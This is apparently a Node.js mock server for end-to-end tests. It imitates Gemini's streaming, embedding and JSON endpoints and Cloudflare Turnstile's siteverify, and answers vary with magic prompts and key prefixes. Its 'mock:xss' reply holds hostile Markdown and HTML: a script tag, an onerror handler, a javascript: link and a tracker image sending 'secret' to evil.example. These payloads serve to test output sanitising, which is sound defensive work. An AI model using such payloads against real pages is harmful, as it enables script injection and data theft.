// A local stand-in for the Gemini API's streamGenerateContent endpoint, so the
// E2E tests never call Google or spend a key. The Worker under test points at
// it with GEMINI_BASE_URL (playwright.config.ts). What it answers depends on
// the last user message:
//   "mock:slow ..."     streams 40 chunks, 150 ms apart (for Stop)
//   "mock:xss"          answers with hostile Markdown and HTML
//   "mock:fail"         a 500 before any text
//   anything about a heat pump: a realistic Markdown answer (for screenshots)
// and on the key: one starting "bad-" gets Gemini's invalid-key answer.
// Memory's calls: batchEmbedContents answers with tests/mocks/embedding.mjs,
// and generateContent (JSON) reads a PDF (the text in its "(...) Tj" strings)
// or picks facts: each sentence of the person's messages that says "I" or
// "my" (at most 3); "mock:fail" anywhere fails.
// It also stands in for Turnstile's siteverify (POST /siteverify).
import { createServer } from 'node:http'
import { mockEmbedding } from './embedding.mjs'

const port = Number(process.env.MOCK_GEMINI_PORT ?? 3127)
const host = process.env.E2E_HOST ?? '127.0.0.2'

const XSS = [
  'Here is **bold** text and a [safe link](https://example.com).',
  '',
  '<script>window.__xss = 1</script><img src=x onerror="window.__xss=2">',
  '',
  '[click](javascript:window.__xss=3) ![tracker](https://evil.example/p.png?d=secret)',
].join('\n')

const SAMPLE = [
  'For a 1960s house with about **38,000 BTU/h** of heat loss at -13°F, a cold-climate heat pump around **3.5 tons** covers it with headroom.',
  '',
  'Two things to check before you get quotes:',
  '',
  '1. **Ductwork.** An undersized trunk line will make any unit noisy and short of air.',
  '2. **Backup heat.** Decide whether to keep the furnace for the coldest nights.',
  '',
  '| Size | Covers | Good for |',
  '|---|---|---|',
  '| 3 tons | ~36,000 BTU/h | tight, well-insulated homes |',
  '| 3.5 tons | ~42,000 BTU/h | your house, with margin |',
].join('\n')

function json(res, status, body) {
  res.writeHead(status, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify(body))
}

function pdfText(base64) {
  const raw = Buffer.from(base64, 'base64').toString('latin1')
  return [...raw.matchAll(/\(([^)]*)\)\s*Tj/g)].map((m) => m[1]).join('\n')
}

function pickFacts(text) {
  const own = text.replace(/^Message \d+:$/gm, '')
  return own
    .split(/(?<=[.!?])\s+|\n+/)
    .map((s) => s.trim())
    .filter((s) => /\b(i|i'm|my)\b/i.test(s))
    .slice(0, 3)
}

/** Memory's non-streaming calls: embeddings, and JSON answers for reading PDFs and picking facts. */
function memoryCall(req, res, body) {
  if (/:batchEmbedContents/.test(req.url ?? '')) {
    const embeddings = (body.requests ?? []).map((r) => {
      const text = (r.content?.parts ?? []).map((p) => p.text ?? '').join(' ')
      return { values: mockEmbedding(text, r.outputDimensionality ?? 768) }
    })
    if (embeddings.some((_, i) => /mock:fail/.test(JSON.stringify(body.requests[i])))) {
      return json(res, 500, { error: { code: 500, message: 'internal', status: 'INTERNAL' } })
    }
    return json(res, 200, { embeddings })
  }
  const parts = (body.contents ?? []).flatMap((c) => c.parts ?? [])
  const text = parts.map((p) => p.text ?? '').join('\n')
  if (/mock:fail/.test(text)) return json(res, 500, { error: { code: 500, message: 'internal', status: 'INTERNAL' } })
  const pdf = parts.find((p) => p.inlineData?.mimeType === 'application/pdf')
  const answer = pdf ? { text: pdfText(pdf.inlineData.data) } : { facts: pickFacts(text) }
  return json(res, 200, { candidates: [{ content: { role: 'model', parts: [{ text: JSON.stringify(answer) }] }, index: 0 }] })
}

function sse(res, chunks, delay) {
  res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache' })
  let i = 0
  const next = () => {
    if (res.destroyed) return
    if (i >= chunks.length) return res.end()
    const body = { candidates: [{ content: { role: 'model', parts: [{ text: chunks[i++] }] }, index: 0 }] }
    res.write(`data: ${JSON.stringify(body)}\r\n\r\n`)
    setTimeout(next, delay)
  }
  next()
}

createServer((req, res) => {
  if (req.method === 'GET' && req.url === '/health') return res.end('ok')
  let raw = ''
  req.on('data', (c) => (raw += c))
  req.on('end', () => {
    // Turnstile's siteverify: Cloudflare's always-pass test widget token, or any
    // token starting "test-ok" (API tests), passes; anything else fails.
    if (req.url === '/siteverify') {
      const token = raw.match(/name="response"\r\n\r\n([^\r]*)/)?.[1] ?? ''
      const success = token === 'XXXX.DUMMY.TOKEN.XXXX' || token.startsWith('test-ok')
      res.writeHead(200, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify({ success, 'error-codes': success ? [] : ['invalid-input-response'] }))
      return
    }
    if (!/:(streamGenerateContent|generateContent|batchEmbedContents)/.test(req.url ?? '')) {
      res.writeHead(404).end()
      return
    }
    const key = req.headers['x-goog-api-key'] ?? ''
    if (String(key).startsWith('bad-')) {
      res.writeHead(400, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify({ error: { code: 400, message: 'API key not valid. Please pass a valid API key.', status: 'INVALID_ARGUMENT' } }))
      return
    }
    let body = {}
    try {
      body = JSON.parse(raw)
    } catch {}
    if (!/:streamGenerateContent/.test(req.url ?? '')) return memoryCall(req, res, body)
    const turns = body.contents ?? []
    const last = turns.filter((t) => t.role === 'user').at(-1)?.parts?.[0]?.text ?? ''
    if (last.startsWith('mock:fail')) {
      res.writeHead(500, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify({ error: { code: 500, message: 'internal', status: 'INTERNAL' } }))
      return
    }
    if (last.startsWith('mock:xss')) return sse(res, [XSS], 10)
    if (/heat pump/i.test(last)) return sse(res, SAMPLE.match(/.{1,24}/gs), 12)
    if (last.startsWith('mock:slow')) return sse(res, Array.from({ length: 40 }, (_, n) => `word${n} `), 150)
    const reply = `You said: "${last}". This is turn ${turns.filter((t) => t.role === 'user').length} of our **chat**.`
    return sse(res, reply.match(/.{1,12}/gs) ?? [reply], 15)
  })
}).listen(port, host, () => console.log(`mock gemini on ${host}:${port}`))
